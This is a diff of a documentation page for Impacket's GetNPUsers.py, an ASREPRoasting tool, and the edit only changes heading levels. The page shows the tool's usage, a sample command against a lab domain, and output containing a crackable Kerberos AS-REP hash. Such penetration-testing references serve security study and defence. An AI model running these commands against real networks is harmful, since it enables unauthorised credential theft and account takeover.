@@ -13,18 +13,18 @@ weight : 0
 
 Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking (ASREPRoasting).
 
-### Installation
+## Installation
 
 Install the [Impacket Framework]({{< ref "../" >}})
 
-### Usage
+## Usage
 
 ```plain
 GetNPUsers.py [-h] [-request] [-outputfile OUTPUTFILE] [-format {hashcat,john}] [-usersfile USERSFILE] [-ts] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address]
                      target
 ```
 
-### Flags
+## Flags
 
 ```plain
 Impacket v0.9.25.dev1+20220201.191645.d8679837 - Copyright 2021 SecureAuth Corporation
@@ -81,7 +81,7 @@ However it will require you to have emily's password. (If you don't specify it, 
 For this operation you don't need credentials.
 ```
 
-### Examples
+## Examples
 
 ```plain
 GetNPUsers.py offsec.nl/ -usersfile users -dc-ip 10.10.20.134
@@ -94,6 +94,6 @@ $krb5asrep$23$svc-admin@offsec.nl:0507c99ed0c44924dee1bd4fdb34e0b9$e6abe0cd017c4
 [-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
 ```
 
-### URL list
+## URL List
 
 * [Github.com](https://github.com/SecureAuthCorp/impacket)
